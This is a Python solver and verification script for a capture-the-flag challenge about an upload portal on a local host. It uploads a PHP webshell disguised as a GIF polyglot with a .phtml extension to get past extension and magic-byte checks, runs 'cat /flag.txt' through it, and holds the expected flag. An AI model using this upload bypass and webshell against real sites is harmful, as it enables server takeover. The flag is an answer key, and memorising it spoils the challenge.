#!/usr/bin/env python3
"""
Automated Solver & Verification Script
Challenge: PHP2SHELL: Faculty Upload Portal Bypass
Author: Tanish Shah (@tanishshahh)
"""

import sys
import re
import requests

TARGET_BASE = "http://127.0.0.1:5003"
EXPECTED_FLAG = "case{php_webshell_rce_faculty_portal}"

def test_blocked_extension(base_url):
    print("[*] Verifying Extension Blacklist (.php rejection)...")
    files = {
        "submission": ("exploit.php", b"<?php system($_GET['cmd']); ?>", "application/pdf")
    }
    resp = requests.post(f"{base_url}/upload", files=files, timeout=5)
    if "SECURITY POLICY VIOLATION" in resp.text:
        print("[+] Standard .php upload blocked correctly.")
        return True
    else:
        print("[-] Blacklist check failed to block .php file.")
        return False

def test_signature_check(base_url):
    print("[*] Verifying Signature & Magic Bytes Validation...")
    files = {
        "submission": ("exploit.phtml", b"<?php system($_GET['cmd']); ?>", "image/gif")
    }
    resp = requests.post(f"{base_url}/upload", files=files, timeout=5)
    if "SIGNATURE MISMATCH" in resp.text:
        print("[+] Stock webshell without magic bytes was rejected properly.")
        return True
    else:
        print("[-] Signature check failed.")
        return False

def test_polyglot_exploit(base_url):
    print("[*] Uploading Valid Polyglot Webshell (.phtml + GIF89a; magic bytes)...")
    polyglot_payload = b"GIF89a;\n<?php system($_GET['cmd']); ?>"
    files = {
        "submission": ("polyglot_shell.phtml", polyglot_payload, "image/gif")
    }
    resp = requests.post(f"{base_url}/upload", files=files, timeout=5)

    if "SUBMISSION SUCCESSFUL" not in resp.text:
        print(f"[-] Polyglot upload was rejected: {resp.text}")
        return False

    print("[+] Polyglot file accepted by server.")

    # Execute /readflag via webshell (using dynamic isolated link or fallback)
    link_match = re.search(r'href="(/uploads/[^"]+)"', resp.text)
    if link_match:
        exec_url = f"{base_url}{link_match.group(1)}?cmd=cat%20/flag.txt"
        print(f"[*] Isolated webshell URL detected: {link_match.group(1)}")
    else:
        exec_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"

    print("[*] Executing command via uploaded webshell (?cmd=cat /flag.txt)...")
    exec_resp = requests.get(exec_url, timeout=5)

    if EXPECTED_FLAG in exec_resp.text:
        print(f"[+] Flag extracted successfully via isolated link: {EXPECTED_FLAG}")
    else:
        print(f"[-] Command output did not contain expected flag: {exec_resp.text}")
        return False

    # Isolation invariant: the un-prefixed name must NOT resolve. Only the
    # uuid-prefixed link handed back to this team may serve the shell.
    fallback_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"
    fb_resp = requests.get(fallback_url, timeout=5)
    if fb_resp.status_code == 404:
        print("[+] Un-prefixed fallback correctly disabled (multi-team isolation).")
        return True
    else:
        print(f"[-] Isolation broken: /uploads/polyglot_shell.phtml returned {fb_resp.status_code}.")
        return False


def test_team_isolation(base_url):
    print("[*] Verifying two teams uploading the same filename stay isolated...")
    payload = b"GIF89a;\n<?php system($_GET['cmd']); ?>"
    links = []
    for _ in range(2):
        files = {"submission": ("shared_shell.phtml", payload, "image/gif")}
        resp = requests.post(f"{base_url}/upload", files=files, timeout=5)
        match = re.search(r'href="(/uploads/[^"]+)"', resp.text)
        if not match:
            print("[-] Upload did not return an isolated access link.")
            return False
        links.append(match.group(1))

    if links[0] == links[1]:
        print(f"[-] Same-filename uploads collided on {links[0]}.")
        return False

    for link in links:
        resp = requests.get(f"{base_url}{link}?cmd=cat%20/flag.txt", timeout=5)
        if EXPECTED_FLAG not in resp.text:
            print(f"[-] Isolated link {link} no longer resolves its own shell.")
            return False

    print(f"[+] Distinct isolated links verified: {links[0]} / {links[1]}")
    return True


def test_size_cap(base_url):
    print("[*] Verifying upload size cap (3 MiB payload)...")
    oversized = b"GIF89a;" + b"A" * (3 * 1024 * 1024)
    files = {"submission": ("huge.phtml", oversized, "image/gif")}
    resp = requests.post(f"{base_url}/upload", files=files, timeout=15)
    if resp.status_code == 413 or "Payload Too Large" in resp.text:
        print("[+] Oversized upload rejected with 413.")
        return True
    print(f"[-] Size cap not enforced (HTTP {resp.status_code}).")
    return False

def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
    print(f"[*] Targeting PHP2SHELL Challenge at {base_url}")

    ok1 = test_blocked_extension(base_url)
    ok2 = test_signature_check(base_url)
    ok3 = test_polyglot_exploit(base_url)
    ok4 = test_team_isolation(base_url)
    ok5 = test_size_cap(base_url)

    if ok1 and ok2 and ok3 and ok4 and ok5:
        print("\n[SUCCESS] PHP2SHELL verification checks passed cleanly (Exit 0).")
        sys.exit(0)
    else:
        print("\n[FAILURE] Verification checks failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
